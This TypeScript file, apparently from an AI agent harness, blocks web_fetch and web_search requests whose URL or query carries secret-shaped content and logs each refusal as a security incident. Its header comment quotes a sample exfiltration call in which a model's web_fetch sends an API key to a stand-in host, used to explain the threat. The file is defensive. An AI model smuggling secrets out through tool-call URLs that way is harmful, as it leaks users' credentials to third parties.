import { detectSecrets, detectEntropy, appendIncident } from "../../security/service";

// S-8 (flow 355, AC4): `web_fetch` and `web_search` checked the requested
// public host, but never the SECRET-SHAPED content a model can put in a URL or
// a query itself — `web_fetch({url:"https://x.example/c?k=sk-…"})` sent the
// key to `x.example` before anything downstream had a chance to redact
// anything, because redaction only ever ran on what came BACK. This is the
// egress-side twin of `redactSensitiveText` (S-6): the same detector floor
// (patterns + entropy, with entropy's own allow-shapes so a URL carrying an
// ordinary commit SHA still fetches), run on what is about to LEAVE the
// machine instead of on what arrived.

/** True when `text` (a URL or a search query) carries secret-shaped content. */
export function containsOutboundSecret(text: string): boolean {
  return detectSecrets(text).length > 0 || detectEntropy(text).length > 0;
}

/**
 * Record the refusal as a security incident (§14) — policy-level metadata
 * only, never the url/query text itself, and never the matched value. A
 * logging failure must not undo a refusal that already happened, so this
 * never throws.
 */
export async function recordOutboundSecretFinding(
  cwd: string,
  tool: "web_fetch" | "web_search",
  subject: "url" | "query",
): Promise<void> {
  try {
    await appendIncident(cwd, {
      at: new Date().toISOString(),
      type: "egress-blocked",
      message: "outbound secret-shaped content",
      details: { policyId: "egress.outbound-secret", tool, subject },
    });
  } catch {
    // Best-effort: the refusal already happened; a disk error here must not
    // surface as a DIFFERENT failure to the caller.
  }
}
